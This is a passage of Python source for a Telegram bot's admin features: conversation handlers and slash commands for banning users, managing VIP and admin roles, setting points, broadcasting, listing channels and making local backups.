        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_UNBAN_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_UNBAN_USER_ID
        
        if not users[user_id].get("banned", False):
            await update.message.reply_text("❌ User is not banned.")
            return GET_UNBAN_USER_ID
        
        # Remove banned flag from user
        users[user_id]["banned"] = False
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to User Management", callback_data="admin_users")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ User {user_id} has been unbanned successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def start_add_vip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start add VIP conversation"""
        await update.callback_query.edit_message_text(
            "⭐ Add VIP User\n\nEnter the user ID to add as VIP:"
        )
        return GET_ADD_VIP_USER_ID

    async def add_vip_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Add VIP status to a user"""
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_ADD_VIP_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_ADD_VIP_USER_ID
        
        if users[user_id].get("is_premium", False):
            await update.message.reply_text("❌ User is already a VIP.")
            return GET_ADD_VIP_USER_ID
        
        # Add VIP status
        users[user_id]["is_premium"] = True
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to VIP Management", callback_data="admin_vip")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ User {user_id} has been added as VIP successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def start_remove_vip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start remove VIP conversation"""
        await update.callback_query.edit_message_text(
            "❌ Remove VIP User\n\nEnter the user ID to remove VIP status:"
        )
        return GET_REMOVE_VIP_USER_ID

    async def remove_vip_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Remove VIP status from a user"""
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_REMOVE_VIP_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_REMOVE_VIP_USER_ID
        
        if not users[user_id].get("is_premium", False):
            await update.message.reply_text("❌ User is not a VIP.")
            return GET_REMOVE_VIP_USER_ID
        
        # Remove VIP status
        users[user_id]["is_premium"] = False
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to VIP Management", callback_data="admin_vip")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ VIP status removed from user {user_id} successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def start_add_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start add admin conversation"""
        await update.callback_query.edit_message_text(
            "🔧 Add Admin\n\nEnter the user ID to add as admin:"
        )
        return GET_ADD_ADMIN_USER_ID

    async def add_admin_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Add admin status to a user"""
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_ADD_ADMIN_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_ADD_ADMIN_USER_ID
        
        admin_users = config.get("admin_users", [])
        if user_id in admin_users:
            await update.message.reply_text("❌ User is already an admin.")
            return GET_ADD_ADMIN_USER_ID
        
        # Add admin status
        admin_users.append(user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin Management", callback_data="admin_admins")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ User {user_id} has been added as admin successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def start_remove_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start remove admin conversation"""
        await update.callback_query.edit_message_text(
            "❌ Remove Admin\n\nEnter the user ID to remove admin status:"
        )
        return GET_REMOVE_ADMIN_USER_ID

    async def remove_admin_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Remove admin status from a user"""
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_REMOVE_ADMIN_USER_ID
        
        admin_users = config.get("admin_users", [])
        if user_id not in admin_users:
            await update.message.reply_text("❌ User is not an admin.")
            return GET_REMOVE_ADMIN_USER_ID
        
        # Remove admin status
        admin_users.remove(user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin Management", callback_data="admin_admins")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ Admin status removed from user {user_id} successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def toggle_referral_system(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Toggle referral system on/off"""
        current_status = config.get("referral_system_on", True)
        config["referral_system_on"] = not current_status
        save_db(config, DB_CONFIG)
        
        new_status = "🟢 ON" if config["referral_system_on"] else "🔴 OFF"
        await update.callback_query.answer(f"Referral system is now {new_status}!")
        
        # Refresh the settings menu
        await self.show_settings(update, context)

    async def view_current_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """View current bot settings"""
        referral_system_on = config.get("referral_system_on", True)
        per_refer = config.get("per_refer", 0)
        per_prediction = config.get("per_prediction", 0)
        
        settings_text = (
            f"⚙️ Current Settings\n\n"
            f"🔗 Referral System: {'🟢 ON' if referral_system_on else '🔴 OFF'}\n"
            f"💰 Referral Points: {per_refer}\n"
            f"🎯 Prediction Points: {per_prediction}\n"
            f"👥 Total Users: {len(users)}\n"
            f"⭐ VIP Users: {len([u for u in users.values() if u.get('is_premium', False)])}\n"
            f"🔧 Admin Users: {len(config.get('admin_users', []))}"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data="admin_settings")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            settings_text,
            reply_markup=reply_markup
        )

    async def cancel_admin_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel admin action"""
        await update.message.reply_text("❌ Action cancelled.")
        return ConversationHandler.END

    # ===== NEW ADMIN COMMAND METHODS =====
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show help for all commands"""
        user_id = str(update.effective_user.id)
        is_admin = self.is_admin(user_id)
        
        help_text = (
            "🤖 **Bot Commands Help**\n\n"
            "**User Commands:**\n"
            "/start - Start the bot\n"
            "/help - Show this help message\n"
            "/cancel - Cancel any active session\n\n"
        )
        
        if is_admin:
            help_text += (
                "**Admin Commands:**\n"
                "/demon - Show admin commands\n"
                "/broadcast <message> - Send message to all users\n"
                "/addvipuser <user_id> <duration> - Add VIP user (e.g., 30 | 12h | 90m)\n"
                "/removevipuser <user_id> - Remove VIP user\n"
                "/vipusers - Show VIP users (active and expired)\n"
                "/banuser <user_id> - Ban user\n"
                "/unbanuser <user_id> - Unban user\n"
                "/addadmin <user_id> - Add admin (Super Admin only)\n"
                "/removeadmin <user_id> - Remove admin (Super Admin only)\n"
                "/addsuperadmin <user_id> - Add super admin (Super Admin only)\n"
                "/removesuperadmin <user_id> - Remove super admin (Super Admin only)\n"
                "/setpoints <user_id> <points> - Set user points\n"
                "/stats - Show bot statistics\n"
                "/download <type> - Download data (users/vip/admins/predictions/channels)\n"
                "/settings - Show current settings\n"
                "/channels - Manage channels\n"
                "/backup - Create data backup\n"
                "/toggle <setting> - Toggle settings\n"
                "/subscription - Manage subscription settings\n"
                "/setcaption <text> - Set subscription caption\n"
                "/setprice <period> <amount> - Set subscription price\n\n"
                "**Examples:**\n"
                "/broadcast Hello everyone!\n"
                "/addvipuser 123456789 30\n"
                "/banuser 123456789\n"
                "/download users\n"
                "/channels add MyChannel https://t.me/mychannel -1001234567890\n"
                "/toggle referral\n"
                "/setcaption 🌟 Premium VIP Subscription\n"
                "/setprice 1_month 15"
            )
        else:
            help_text += (
                "**Note:** Admin commands are only available to administrators.\n"
                "Contact an admin if you need assistance."
            )
        
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /broadcast command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /broadcast <message>\nExample: /broadcast Hello everyone!")
            return
        
        message = " ".join(context.args)
        success_count = 0
        failed_count = 0
        
        await update.message.reply_text("📢 Broadcasting message...")
        
        for user_id_str in users.keys():
            try:
                await context.bot.send_message(
                    chat_id=int(user_id_str),
                    text=f"📢 **Broadcast Message**\n\n{message}"
                )
                success_count += 1
            except Exception as e:
                failed_count += 1
                logger.error(f"Failed to send broadcast to {user_id_str}: {e}")
        
        await update.message.reply_text(
            f"✅ Broadcast completed!\n"
            f"✅ Successfully sent: {success_count}\n"
            f"❌ Failed: {failed_count}"
        )

    async def add_vip_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /addvipuser command

        Usage:
        /addvipuser <user_id> <duration>
        duration supports days (default), minutes, hours: e.g. 30, 30d, 12h, 90m
        """
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /addvipuser <user_id> <duration>\nExamples: /addvipuser 123456789 30 | 12h | 90m")
            return
        
        target_user_id = context.args[0]
        duration_raw = context.args[1]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        td = self._parse_duration_to_timedelta(duration_raw)
        if td is None:
            await update.message.reply_text("❌ Invalid duration. Use number of days or suffix with m/h/d. Examples: 30, 90m, 12h, 7d")
            return
        
        # Add VIP status
        if target_user_id not in users:
            users[target_user_id] = {"joined_date": datetime.now().isoformat()}
        
        users[target_user_id]["is_premium"] = True
        # If user already has an expiry in the future, extend from that point
        base_start = datetime.now()
        prev_expiry = users[target_user_id].get("premium_expiry")
        try:
            if prev_expiry and datetime.fromisoformat(prev_expiry) > base_start:
                base_start = datetime.fromisoformat(prev_expiry)
        except Exception:
            pass
        users[target_user_id]["premium_expiry"] = (base_start + td).isoformat()
        
        save_db(users, DB_USERS)
        
        # Notify the user
        await self.notify_admin_action(
            "VIP Added", 
            target_user_id, 
            user_id, 
            f"VIP status added for {duration_raw}"
        )
        
        await update.message.reply_text(
            f"✅ User {target_user_id} is VIP until {users[target_user_id]['premium_expiry']}"
        )

    async def remove_vip_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /removevipuser command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removevipuser <user_id>\nExample: /removevipuser 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        if target_user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return
        
        if not users[target_user_id].get("is_premium", False):
            await update.message.reply_text("❌ User is not a VIP.")
            return
        
        # Remove VIP status
        users[target_user_id]["is_premium"] = False
        if "premium_expiry" in users[target_user_id]:
            # keep record under premium_expired_at
            try:
                users[target_user_id]["premium_expired_at"] = users[target_user_id]["premium_expiry"]
            except Exception:
                pass
            del users[target_user_id]["premium_expiry"]
        
        save_db(users, DB_USERS)
        
        # Notify the user
        await self.notify_admin_action(
            "VIP Removed", 
            target_user_id, 
            user_id, 
            "VIP status has been removed"
        )
        
        await update.message.reply_text(f"✅ VIP status removed from user {target_user_id}!")

    async def vip_users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /vipusers command - list active and expired VIP users"""
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return

        active_rows = []
        expired_rows = []
        now = datetime.now()
        
        def _fmt_remaining(delta: timedelta) -> str:
            total_seconds = int(delta.total_seconds())
            if total_seconds < 0:
                total_seconds = 0
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            parts = []
            if days:
                parts.append(f"{days}d")
            if hours:
                parts.append(f"{hours}h")
            if minutes or not parts:
                parts.append(f"{minutes}m")
            return " ".join(parts)
        for uid, u in users.items():
            if not isinstance(u, dict):
                continue
            is_premium = u.get("is_premium", False)
            expiry_iso = u.get("premium_expiry")
            name = u.get("name", "Unknown")
            if is_premium:
                # auto-expire check
                self._auto_expire_if_needed(uid)
                is_premium = u.get("is_premium", False)
                expiry_iso = u.get("premium_expiry")
            if is_premium and expiry_iso:
                try:
                    expiry_dt = datetime.fromisoformat(expiry_iso)
                    remaining = expiry_dt - now
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — until `{expiry_iso}` `in {_fmt_remaining(remaining)}`")
                except Exception:
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — until `{expiry_iso}`")
            elif is_premium and not expiry_iso:
                active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — no expiry set")
            else:
                # expired or not vip but had history
                expired_at = u.get("premium_expired_at") or u.get("premium_expiry")
                if expired_at:
                    expired_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — expired `{expired_at}`")

        active_text = "\n".join(active_rows) or "_None_"
        expired_text = "\n".join(expired_rows) or "_None_"
        msg = (
            "⭐ *VIP Users*\n\n"
            f"*Active:*\n{active_text}\n\n"
            f"*Expired:*\n{expired_text}"
        )
        await update.message.reply_text(msg, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def ban_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /banuser command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /banuser <user_id>\nExample: /banuser 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        if target_user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return
        
        if users[target_user_id].get("is_banned", False):
            await update.message.reply_text("❌ User is already banned.")
            return
        
        # Ban user
        users[target_user_id]["is_banned"] = True
        users[target_user_id]["banned_date"] = datetime.now().isoformat()
        
        save_db(users, DB_USERS)
        
        # Notify the user
        await self.notify_admin_action(
            "User Banned", 
            target_user_id, 
            user_id, 
            "Your account has been banned from using the bot"
        )
        
        await update.message.reply_text(f"✅ User {target_user_id} has been banned!")

    async def unban_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /unbanuser command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /unbanuser <user_id>\nExample: /unbanuser 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        if target_user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return
        
        if not users[target_user_id].get("is_banned", False):
            await update.message.reply_text("❌ User is not banned.")
            return
        
        # Unban user
        users[target_user_id]["is_banned"] = False
        if "banned_date" in users[target_user_id]:
            del users[target_user_id]["banned_date"]
        
        save_db(users, DB_USERS)
        
        # Notify the user
        await self.notify_admin_action(
            "User Unbanned", 
            target_user_id, 
            user_id, 
            "Your account ban has been removed"
        )
        
        await update.message.reply_text(f"✅ User {target_user_id} has been unbanned!")

    async def add_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /addadmin command - Only super admins can add new admins"""
        user_id = str(update.effective_user.id)
        
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ Only super admins can add new admins.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /addadmin <user_id>\nExample: /addadmin 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        admin_users = config.get("admin_users", [])
        if target_user_id in admin_users:
            await update.message.reply_text("❌ User is already an admin.")
            return
        
        # Add admin
        admin_users.append(target_user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        
        # Notify the new admin
        await self.notify_admin_action(
            "Admin Added", 
            target_user_id, 
            user_id, 
            "You have been promoted to admin status"
        )
        
        await update.message.reply_text(f"✅ User {target_user_id} has been added as admin!")

    async def remove_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /removeadmin command - Only super admins can remove admins"""
        user_id = str(update.effective_user.id)
        
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ Only super admins can remove admins.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removeadmin <user_id>\nExample: /removeadmin 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        admin_users = config.get("admin_users", [])
        if target_user_id not in admin_users:
            await update.message.reply_text("❌ User is not an admin.")
            return
        
        # Prevent removing super admins
        super_admin_users = config.get("super_admin_users", [])
        if target_user_id in super_admin_users:
            await update.message.reply_text("❌ Cannot remove super admin status.")
            return
        
        # Remove admin
        admin_users.remove(target_user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        
        # Notify the removed admin
        await self.notify_admin_action(
            "Admin Removed", 
            target_user_id, 
            user_id, 
            "Your admin status has been removed"
        )
        
        await update.message.reply_text(f"✅ Admin status removed from user {target_user_id}!")

    async def add_super_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /addsuperadmin command - Only existing super admins can add new super admins"""
        user_id = str(update.effective_user.id)
        
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ Only super admins can add new super admins.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /addsuperadmin <user_id>\nExample: /addsuperadmin 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        super_admin_users = config.get("super_admin_users", [])
        if target_user_id in super_admin_users:
            await update.message.reply_text("❌ User is already a super admin.")
            return
        
        # Add super admin
        super_admin_users.append(target_user_id)
        config["super_admin_users"] = super_admin_users
        
        # Also add to regular admins if not already there
        admin_users = config.get("admin_users", [])
        if target_user_id not in admin_users:
            admin_users.append(target_user_id)
            config["admin_users"] = admin_users
        
        save_db(config, DB_CONFIG)
        
        # Notify the new super admin
        await self.notify_admin_action(
            "Super Admin Added", 
            target_user_id, 
            user_id, 
            "You have been promoted to super admin status"
        )
        
        await update.message.reply_text(f"✅ User {target_user_id} has been added as super admin!")

    async def remove_super_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /removesuperadmin command - Only super admins can remove super admins"""
        user_id = str(update.effective_user.id)
        
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ Only super admins can remove super admins.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removesuperadmin <user_id>\nExample: /removesuperadmin 123456789")
            return
        
        target_user_id = context.args[0]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        super_admin_users = config.get("super_admin_users", [])
        if target_user_id not in super_admin_users:
            await update.message.reply_text("❌ User is not a super admin.")
            return
        
        # Prevent removing the last super admin
        if len(super_admin_users) <= 1:
            await update.message.reply_text("❌ Cannot remove the last super admin.")
            return
        
        # Remove super admin
        super_admin_users.remove(target_user_id)
        config["super_admin_users"] = super_admin_users
        save_db(config, DB_CONFIG)
        
        # Notify the removed super admin
        await self.notify_admin_action(
            "Super Admin Removed", 
            target_user_id, 
            user_id, 
            "Your super admin status has been removed"
        )
        
        await update.message.reply_text(f"✅ Super admin status removed from user {target_user_id}!")

    async def set_points_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setpoints command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /setpoints <user_id> <points>\nExample: /setpoints 123456789 100")
            return
        
        target_user_id = context.args[0]
        points = context.args[1]
        
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return
        
        if not points.isdigit():
            await update.message.reply_text("❌ Invalid points. Please enter a valid number.")
            return
        
        if target_user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return
        
        # Set points
        users[target_user_id]["points"] = int(points)
        save_db(users, DB_USERS)
        
        await update.message.reply_text(f"✅ Points set to {points} for user {target_user_id}!")

    async def set_referral_points_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setreferral <points>"""
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        if len(context.args) != 1 or not context.args[0].isdigit():
            await update.message.reply_text("❌ Usage: /setreferral <points>\nExample: /setreferral 5")
            return
        points = int(context.args[0])
        config["per_refer"] = points
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ Referral points set to: {points}")

    async def set_prediction_points_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setprediction <points>"""
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        if len(context.args) != 1 or not context.args[0].isdigit():
            await update.message.reply_text("❌ Usage: /setprediction <points>\nExample: /setprediction 1")
            return
        points = int(context.args[0])
        config["per_prediction"] = points
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ Prediction points set to: {points}")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        total_users = len(users)
        vip_users = len([u for u in users.values() if u.get("is_premium", False)])
        banned_users = len([u for u in users.values() if u.get("is_banned", False)])
        total_admins = len(config.get("admin_users", []))
        total_predictions = len(predictions)
        total_channels = len(channels)
        
        stats_text = (
            f"📊 **Bot Statistics**\n\n"
            f"👥 Total Users: {total_users}\n"
            f"⭐ VIP Users: {vip_users}\n"
            f"🚫 Banned Users: {banned_users}\n"
            f"🔧 Admin Users: {total_admins}\n"
            f"🎯 Total Predictions: {total_predictions}\n"
            f"📢 Total Channels: {total_channels}\n\n"
            f"📈 Active Users: {total_users - banned_users}"
        )
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')

    async def download_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /download command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ Usage: /download <type>\n"
                "Types: users, vip, admins, predictions, channels\n"
                "Example: /download users"
            )
            return
        
        download_type = context.args[0].lower()
        
        if download_type == "users":
            await self.download_users_data(update, context)
        elif download_type == "vip":
            await self.download_vip_data(update, context)
        elif download_type == "admins":
            await self.download_admins_data(update, context)
        elif download_type == "predictions":
            await self.download_predictions_data(update, context)
        elif download_type == "channels":
            await self.download_channels_data(update, context)
        else:
            await update.message.reply_text(
                "❌ Invalid type. Available types: users, vip, admins, predictions, channels"
            )

    async def settings_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /settings command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        referral_system_on = config.get("referral_system_on", True)
        per_refer = config.get("per_refer", 0)
        per_prediction = config.get("per_prediction", 0)
        
        settings_text = (
            f"⚙️ **Current Settings**\n\n"
            f"🔗 Referral System: {'🟢 ON' if referral_system_on else '🔴 OFF'}\n"
            f"💰 Referral Points: {per_refer}\n"
            f"🎯 Prediction Points: {per_prediction}\n"
            f"👥 Total Users: {len(users)}\n"
            f"⭐ VIP Users: {len([u for u in users.values() if u.get('is_premium', False)])}\n"
            f"🔧 Admin Users: {len(config.get('admin_users', []))}\n\n"
            f"**Commands:**\n"
            f"• `/toggle referral` - Toggle referral system\n"
            f"• `/setreferral <points>` - Set referral points\n"
            f"• `/setprediction <points>` - Set prediction points"
        )
        
        await update.message.reply_text(settings_text, parse_mode='Markdown')

    async def channels_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /channels command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if not context.args:
            # Show current channels
            if not channels:
                await update.message.reply_text("📢 No channels configured.")
                return
            
            channels_text = "📢 **Current Channels:**\n\n"
            for i, channel in enumerate(channels, 1):
                channels_text += f"{i}. **{channel['name']}**\n"
                channels_text += f"   URL: {channel['url']}\n"
                channels_text += f"   ID: `{channel['id']}`\n\n"
            
            channels_text += "**Commands:**\n"
            channels_text += "• `/channels add <name> <url> <id>` - Add channel\n"
            channels_text += "• `/channels remove <id>` - Remove channel\n"
            channels_text += "• `/channels list` - List all channels"
            
            await update.message.reply_text(channels_text, parse_mode='Markdown')
            return
        
        action = context.args[0].lower()
        
        if action == "add" and len(context.args) >= 4:
            name = context.args[1]
            url = context.args[2]
            channel_id = context.args[3]
            
            if not channel_id.startswith('-'):
                await update.message.reply_text("❌ Channel ID must start with '-' (e.g., -1001234567890)")
                return
            
            new_channel = {
                "name": name,
                "url": url,
                "id": int(channel_id)
            }
            
            channels.append(new_channel)
            save_db(channels, DB_CHANNELS)
            
            await update.message.reply_text(f"✅ Channel '{name}' added successfully!")
            
        elif action == "remove" and len(context.args) >= 2:
            channel_id = context.args[1]
            
            if not channel_id.startswith('-'):
                await update.message.reply_text("❌ Channel ID must start with '-'")
                return
            
            channel_id = int(channel_id)
            removed = False
            
            for i, channel in enumerate(channels):
                if channel['id'] == channel_id:
                    removed_channel = channels.pop(i)
                    save_db(channels, DB_CHANNELS)
                    await update.message.reply_text(f"✅ Channel '{removed_channel['name']}' removed successfully!")
                    removed = True
                    break
            
            if not removed:
                await update.message.reply_text("❌ Channel not found.")
                
        elif action == "list":
            if not channels:
                await update.message.reply_text("📢 No channels configured.")
                return
            
            channels_text = "📢 **All Channels:**\n\n"
            for i, channel in enumerate(channels, 1):
                channels_text += f"{i}. **{channel['name']}**\n"
                channels_text += f"   URL: {channel['url']}\n"
                channels_text += f"   ID: `{channel['id']}`\n\n"
            
            await update.message.reply_text(channels_text, parse_mode='Markdown')
            
        else:
            await update.message.reply_text(
                "❌ Usage:\n"
                "• `/channels` - Show current channels\n"
                "• `/channels add <name> <url> <id>` - Add channel\n"
                "• `/channels remove <id>` - Remove channel\n"
                "• `/channels list` - List all channels"
            )

    async def backup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /backup command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        try:
            import shutil
            from datetime import datetime
            
            # Create backup directory
            backup_dir = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            os.makedirs(backup_dir, exist_ok=True)
            
            # Copy all data files
            data_files = ["users.json", "predictions.json", "config.json", "channels.json", "admins.json"]
            for file in data_files:
                if os.path.exists(f"data/{file}"):
                    shutil.copy2(f"data/{file}", f"{backup_dir}/{file}")
            
            await update.message.reply_text(f"✅ Backup created successfully!\n📁 Directory: `{backup_dir}`")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Backup failed: {str(e)}")

    async def toggle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /toggle command"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ You don't have permission to use this command.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /toggle <setting>\nExample: /toggle referral")
            return
        
        setting = context.args[0].lower()
        
        if setting == "referral":
            current_status = config.get("referral_system_on", True)
            config["referral_system_on"] = not current_status
            save_db(config, DB_CONFIG)
            
            new_status = "🟢 ON" if config["referral_system_on"] else "🔴 OFF"
            await update.message.reply_text(f"✅ Referral system is now {new_status}!")
            
            # Notify all users about the change
            notification_message = (
                f"📢 **System Update**\n\n"
                f"🔗 **Referral System Status Changed**\n"
                f"The referral system is now {new_status}\n\n"
                f"{'✅ You can now earn points by referring friends!' if config['referral_system_on'] else '❌ Referral system is temporarily disabled.'}"
            )
            
            success_count = 0
            failed_count = 0
            
            for user_id_str in users.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(user_id_str),
